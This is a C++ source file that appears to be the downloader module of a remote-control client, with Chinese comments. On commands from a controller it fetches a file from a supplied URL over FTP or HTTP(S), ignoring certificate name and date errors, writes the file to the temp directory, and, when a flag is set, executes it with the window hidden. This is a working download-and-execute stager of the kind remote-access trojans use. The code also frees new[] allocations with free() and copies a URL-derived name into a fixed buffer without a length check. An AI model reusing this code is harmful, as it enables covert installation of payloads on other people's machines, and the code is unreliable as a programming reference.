#include "FileDownloader.h"
#include <stdio.h>
#include "utils.h"
#include <json\json.h>
#include <string>
#include <Shlwapi.h>

#pragma comment(lib,"wininet.lib")

#ifdef _DEBUG
#pragma comment(lib,"jsond.lib")
#else
#pragma comment(lib,"json.lib")
#endif

CFileDownloader::CFileDownloader(CClient* pClient,
	Module * owner,
	UINT32 flags,
	const TCHAR * saveDir, const TCHAR * url) :
CEventHandler(pClient, MINIDOWNLOAD)
{
	TCHAR szTempPath[MAX_PATH];
	GetTempPath(MAX_PATH, szTempPath);

	//save path + url.
	if (!saveDir)
		saveDir = szTempPath;
	//
	m_szLocalFileName = new TCHAR[lstrlen(saveDir) + 1];
	lstrcpy(m_szLocalFileName, saveDir);

	m_szUrl = new TCHAR[lstrlen(url) + 1];
	lstrcpy(m_szUrl, url);

	m_flags = flags;
	
	//
	m_szUrlPath   = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
	m_szHost      = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
	m_szUser      = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
	m_szPassword  = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
	m_szExtraInfo = (TCHAR*)calloc(1, 0x1000 * sizeof(TCHAR));
	
	//
	m_DownloadSuccess = FALSE;
	m_lpBuffer = (BYTE*)malloc(0x10000);		//64kb

	m_iFinishedSize = 0;
	m_iTotalSize = -1;

	m_hConnect = NULL;
	m_hInternet = NULL;
	m_hRemoteFile = NULL;
	m_hLocalFile = INVALID_HANDLE_VALUE;

	m_owner = owner;
	if (m_owner)
		get_module(m_owner);
}


CFileDownloader::~CFileDownloader()
{
	//initial params.
	free(m_szLocalFileName);
	free(m_szUrl);

	//url info
	free(m_szUrlPath);
	free(m_szHost);
	free(m_szUser);
	free(m_szPassword);
	free(m_szExtraInfo);

	//download buffer.
	free(m_lpBuffer);

	if (m_owner)
		put_module(m_owner);
}

void CFileDownloader::OnClose()
{
	if (m_hLocalFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hLocalFile);
		m_hLocalFile = INVALID_HANDLE_VALUE;
	}
	
	if (m_hRemoteFile != NULL)
	{
		InternetCloseHandle(m_hRemoteFile);
		m_hRemoteFile = NULL;
	}
	
	if (m_hConnect != NULL)
	{
		InternetCloseHandle(m_hConnect);
		m_hConnect = NULL;
	}
	
	if (m_hInternet != NULL)
	{
		InternetCloseHandle(m_hInternet);
		m_hInternet = NULL;
	}
	
	if (!m_DownloadSuccess)
	{
		DeleteFile(m_szLocalFileName);
	}
}

void CFileDownloader::OnOpen()
{

}

void CFileDownloader::OnEvent(UINT32 e, BYTE* lpData, UINT Size)
{
	switch (e)
	{
	case MNDD_GET_FILE_INFO:
		OnGetFileInfo();
		break;
	case MNDD_DOWNLOAD_CONTINUE:
		OnContinueDownload();
		break;
	case MNDD_DOWNLOAD_END:
		OnEndDownload();
		break;
	}
}

void CFileDownloader::OnEndDownload()
{
	Close();
	//
	m_DownloadSuccess = TRUE;

	if (m_flags &  FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD)
	{
		ShellExecute(NULL, TEXT("open"), m_szLocalFileName, NULL, NULL, SW_HIDE);
	}
}

/*
{
	"code" : "",
	"err" : "",
	"total_size" : 
	"finished_size" : 
}
*/

void CFileDownloader::OnContinueDownload()
{
	//Continue Download.
	Json::Value root;
	DWORD dwReadBytes = 0;
	DWORD dwWriteBytes = 0;
	Json::FastWriter writer = Json::FastWriter();

	std::string res;

	if (!InternetReadFile(
		m_hRemoteFile, 
		m_lpBuffer, 
		0x10000, 
		&dwReadBytes))
	{
		root["code"] = "-1";
		root["err"] = "InternetReadFile Failed";
		res = writer.write(root);
		Send(MNDD_DOWNLOAD_RESULT, (void*)res.c_str(), res.length() + 1);
		return;
	}

	if (!WriteFile(
		m_hLocalFile,
		m_lpBuffer,
		dwReadBytes, 
		&dwWriteBytes, 
		NULL) ||
		dwReadBytes != dwWriteBytes)
	{

		root["code"] = "-2";
		root["err"] = "WriteFile Failed";
		res = Json::FastWriter().write(root);
		Send(MNDD_DOWNLOAD_RESULT, (void*)res.c_str(), res.length() + 1);
		return;
	}

	m_iFinishedSize += dwReadBytes;
	//
	root["code"] = "0";		//下载完成...
	root["err"] = "continue";
	root["total_size"] = (int)m_iTotalSize;
	root["finished_size"] = (int)m_iFinishedSize;

	if (!dwReadBytes || 
		m_iFinishedSize == m_iTotalSize)
	{
		root["err"] = "finished";
	}

	res = Json::FastWriter().write(root);
	Send(MNDD_DOWNLOAD_RESULT, (void*)res.c_str(), res.length() + 1);
	return;
}

/*
{
	"code" : ,
	"err" : "",
	"filename" : "",
	"url" : "",
	"filesize:" : int,
}
*/

void CFileDownloader::OnGetFileInfo()
{
	Json::Value root;
	DWORD HttpFlag = NULL; 
	char buffer[128] = {0};			//http file size够了;
	DWORD dwBufferLength = 128;
	TCHAR  szFileName[MAX_PATH];
	TCHAR * p;
	std::string res;
	Json::FastWriter writer = Json::FastWriter();
	UINT32 localFileNameLength = 0;
	TCHAR * localFileName;

	//Get Save Path And Url.
	dbg_log("OnGetFileInfo");
	//
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.lpszHostName = m_szHost;
	url.lpszPassword = m_szPassword;
	url.lpszUserName = m_szUser;
	url.lpszExtraInfo = m_szExtraInfo;
	url.lpszUrlPath = m_szUrlPath;

	url.dwHostNameLength = 0x1000 - 1;
	url.dwPasswordLength = 0x1000 - 1;
	url.dwUserNameLength = 0x1000 - 1;
	url.dwUrlPathLength = 0x1000 - 1;
	url.dwExtraInfoLength = 0x1000 - 1;

	//url解析失败;
	if (FALSE == InternetCrackUrl(m_szUrl, lstrlen(m_szUrl), ICU_ESCAPE, &url))
	{
		root["code"] = "-1";
		root["err"] = "InternetCrackUrl Failed";
		res = writer.write(root);
		Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
		return;
	}

	//Get File Name
	p = m_szUrlPath + lstrlen(m_szUrlPath) - 1;
	
	while (p > m_szUrlPath && p[0] != L'\\' && p[0] != L'/')
		p--;

	if ((p[0] == L'\\' || p[0] == L'/') && p[1])
	{
		lstrcpy(szFileName, p + 1);
	}
	else
	{
		lstrcpy(szFileName, TEXT("index.html"));
	}

	//make local filename.
	localFileNameLength = lstrlen(m_szLocalFileName) + 1 + lstrlen(szFileName);
	localFileName = (TCHAR*)malloc(sizeof(TCHAR) * (localFileNameLength + 1));

	lstrcpy(localFileName, m_szLocalFileName);
	lstrcat(localFileName, TEXT("\\"));
	lstrcat(localFileName, szFileName);
	localFileName[localFileNameLength] = 0;

	free(m_szLocalFileName);

	m_szLocalFileName = localFileName;

	//get remote file information.
	m_hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);

	if (!m_hInternet)
	{
		root["code"] = "-2";
		root["err"] = "InternetOpen Failed";
		res = writer.write(root);
		Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
		return;
	}
	
	switch (url.nScheme)
	{
	case INTERNET_SCHEME_FTP:
		m_hConnect = InternetConnect(
			m_hInternet, 
			m_szHost, 
			url.nPort,
			m_szUser,
			m_szPassword,
			INTERNET_SERVICE_FTP,
			0,
			0);
		if (!m_hConnect){
			root["code"] = "-3";
			root["err"] = "InternetConnect Failed";
			res = writer.write(root);
			Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
			return;
		}
		m_hRemoteFile = FtpOpenFile(
			m_hConnect, 
			m_szUrlPath,
			GENERIC_READ,
			0,
			0);

		if (!m_hRemoteFile)
		{
			root["code"] = "-3";
			root["err"] = "FtpOpenFile Failed";
			res = writer.write(root);
			Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
			return;
		}
		//不支持大于4 G ......
		m_iTotalSize = (int)FtpGetFileSize(m_hRemoteFile, NULL);
		break;
	
	case INTERNET_SCHEME_HTTPS:
		HttpFlag |= (INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID
			| INTERNET_FLAG_IGNORE_CERT_DATE_INVALID);
	
	case INTERNET_SCHEME_HTTP:
		m_hConnect = InternetConnect(
			m_hInternet,
			m_szHost,
			url.nPort,
			m_szUser,
			m_szPassword, 
			INTERNET_SERVICE_HTTP,
			0,
			0);
		
		if (!m_hConnect)
		{
			root["code"] = "-4";
			root["err"] = "InternetConnect Failed";
			res = writer.write(root);
			Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
			return;
		}

		m_hRemoteFile = HttpOpenRequest(
			m_hConnect, 
			TEXT("GET"), 
			m_szUrlPath, 
			TEXT("1.1"), 
			NULL,
			NULL,
			HttpFlag, 
			NULL);
		
		if (!m_hRemoteFile)
		{
			root["code"] = "-5";
			root["err"] = "HttpOpenRequest Failed";
			res = writer.write(root);
			Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
			return;
		}

		if(!HttpSendRequestA(m_hRemoteFile, NULL, NULL, NULL, NULL))
		{
			root["code"] = "-6";
			root["err"] = "HttpSendRequest Failed";
			res = writer.write(root);
			Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
			return;
		}

		if (HttpQueryInfoA(
			m_hRemoteFile, 
			HTTP_QUERY_CONTENT_LENGTH, 
			buffer,
			&dwBufferLength,
			0))
		{
			//如果有 content-length的话，就保存起来..
			m_iTotalSize = atoi(buffer);
		}
		break;
	default:
		do{
			root["code"] = "-8";
			root["err"] = "Unsupported  Protocol.";
			res = writer.write(root);
			Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
			return;
		} while (0);
	}

	MakesureDirExist(m_szLocalFileName,TRUE);

	m_hLocalFile = CreateFile(
		m_szLocalFileName,
		GENERIC_WRITE, 
		FILE_SHARE_READ, 
		0, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		0);

	if (m_hLocalFile == INVALID_HANDLE_VALUE)
	{
		root["code"] = "-9";
		root["err"] = "CreateFile Failed.";
		res = writer.write(root);
		Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
		return;
	}

	//success.
	root["code"] = "0";
	root["err"] = "success";
	root["filesize"] = m_iTotalSize;	//-1 表示未知..
	//url...
	
	//file name...
#ifdef UNICODE 
	char tmp[MAX_PATH] = { 0 };
	WideCharToMultiByte(CP_ACP, 0, szFileName, lstrlen(szFileName), tmp, MAX_PATH - 1, NULL, NULL);
	root["filename"] = tmp;

	WideCharToMultiByte(CP_ACP, 0, m_szUrl, lstrlen(m_szUrl), tmp, MAX_PATH - 1, NULL, NULL);
	root["url"] = tmp;
#else
	root["filename"] = szFileName;
	root["url"] = m_szUrl;
#endif 
	//
	res = writer.write(root);
	Send(MNDD_FILE_INFO, (void*)res.c_str(), res.length() + 1);
	return;
}

